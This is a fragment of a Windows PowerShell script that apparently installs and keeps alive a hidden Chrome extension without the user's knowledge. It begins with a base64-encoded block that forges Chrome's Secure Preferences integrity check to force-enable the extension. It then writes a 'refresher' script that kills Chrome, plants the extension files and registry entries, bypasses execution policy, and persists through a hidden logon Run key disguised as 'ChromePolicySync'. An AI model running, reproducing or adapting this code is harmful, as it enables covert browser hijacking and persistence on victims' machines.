RmlsZV06OlJlYWRBbGxCeXRlcygkcGFrKTsgJGNvdW50PVtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQxNigkYiw0KTsgJGlkeD0tMQ0KICAgIGZvcigkaT0wOyRpIC1sdCAkY291bnQ7JGkrKyl7ICRvZmY9NisoJGkqNik7IGlmKFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQxNigkYiwkb2ZmKS1lcSAxNDYpeyRpZHg9JGk7YnJlYWt9IH0NCiAgICBpZigkaWR4IC1sdCAwKXtyZXR1cm4gJG51bGx9DQogICAgJGVvZmY9NisoJGlkeCo2KTsgJGRhdGFPZmY9W0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRiLCRlb2ZmKzIpOyAkZGF0YUxlbj1bQml0Q29udmVydGVyXTo6VG9VSW50MTYoJGIsJGVvZmYrNCkNCiAgICBpZigkZGF0YUxlbiAtbmUgNjQpe3JldHVybiAkbnVsbH07ICRzZWVkPU5ldy1PYmplY3QgYnl0ZVtdIDY0OyBbQXJyYXldOjpDb3B5KCRiLCRkYXRhT2ZmLCRzZWVkLDAsNjQpOyByZXR1cm4gJHNlZWQNCn0NCiRzZWVkPUdldC1TZWVkICRDaHJvbWVEaXINCmlmKC1ub3QgJHNlZWQpeyAkaD0iZTc0OGYzMzZkODVlYTVmOWRjZGYyNWQ4ZjM0N2E2NWI0Y2RmNjY3NjAwZjAyZGY2NzI0YTJhZjE4YTIxMmQyNmI3ODhhMjUwODY5MTBjZjNhOTAzMTM2OTY4NzFmM2RjMDU4MjM3MzBjOTFkZjhiYTVjNGZkOWM4ODRiNTA1YTgiOyAkc2VlZD1OZXctT2JqZWN0IGJ5dGVbXSA2NDsgZm9yKCRpPTA7JGkgLWx0IDY0OyRpKyspeyRzZWVkWyRpXT1bQ29udmVydF06OlRvQnl0ZSgkaC5TdWJzdHJpbmcoJGkqMiwyKSwxNil9IH0NCiRzaWQ9KFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Vc2VyLlZhbHVlOyAkcD0kc2lkLlNwbGl0KCctJyk7ICRkZXY9KCRwWzAuLigkcC5MZW5ndGgtMildKSAtam9pbiAnLScNCltFeHRFbmFibGVdOjpJbml0KCRzZWVkLCRkZXYpDQokYz1bSU8uRmlsZV06OlJlYWRBbGxUZXh0KCRTZWNQcmVmc1BhdGgsW1RleHQuRW5jb2RpbmddOjpVVEY4KQ0KJHA9W0V4dEVuYWJsZV06OlBhdGNoKCRjLCRFeHRJZCkNCmlmKCRwKXsgW0lPLkZpbGVdOjpXcml0ZUFsbFRleHQoJFNlY1ByZWZzUGF0aCwkcCwoTmV3LU9iamVjdCBUZXh0LlVURjhFbmNvZGluZygkZmFsc2UpKSkgfQ0K'))

$refresherScript = @"
Start-Sleep 5
`$persistDir = "$persistDir"
`$extId = Get-Content "`$persistDir\ext_id.txt" -ErrorAction SilentlyContinue
if (-not `$extId) { exit }
`$chromeExe = "C:\Program Files\Google\Chrome\Application\chrome.exe"
if (-not (Test-Path `$chromeExe)) { `$chromeExe = "`${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe" }
`$chromeDir = Split-Path `$chromeExe -Parent
`$secPrefs = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Secure Preferences"
`$extDir = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\`$extId\1.0_0"
`$extSrc = "`$persistDir\extension"
`$localUrl = "file:///`$(Join-Path `$persistDir `"update.xml`" -replace '\\','/')"
`$crxPath = "`$persistDir\extension.crx"

Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 2
New-Item -Path `$extDir -ItemType Directory -Force | Out-Null
Copy-Item "`$extSrc\manifest.json" `$extDir -Force
Copy-Item "`$extSrc\sw.js" `$extDir -Force
cmd /c "reg add `"HKCU\Software\Google\Chrome\Extensions\`$extId`" /v update_url /t REG_SZ /d `"`$localUrl`" /f" >nul 2>&1
cmd /c "reg add `"HKCU\Software\Google\Chrome\Extensions\`$extId`" /v path /t REG_SZ /d `"`$crxPath`" /f" >nul 2>&1
cmd /c "reg add `"HKCU\Software\Google\Chrome\Extensions\`$extId`" /v version /t REG_SZ /d 1.0 /f" >nul 2>&1
if (Test-Path `$secPrefs) {
    & powershell -NoProfile -ExecutionPolicy Bypass -File "`$persistDir\enable.ps1" -ExtId `$extId -ChromeDir `$chromeDir -SecPrefsPath `$secPrefs
}
Start-Process `$chromeExe
"@

$refresherPath = Join-Path $persistDir "refresher.ps1"
Set-Content $refresherPath $refresherScript -Encoding UTF8

# Persist via HKCU Run key (user-only, no admin)
$taskAction = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$refresherPath`""
$taskName = "ChromePolicySync"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value $taskAction
Log "  HKCU Run key $taskName created"

Log "=========================================="
Log "DONE v10 - Policy Extension"
Log "  Extension ID: $extId"
Log "  Persist dir: $persistDir"
Log "  Refresher: $refresherPath (runs at logon)"
Log "  Method: Policy (reg.exe) + HMAC fallback + Run key refresher"
Log "=========================================="
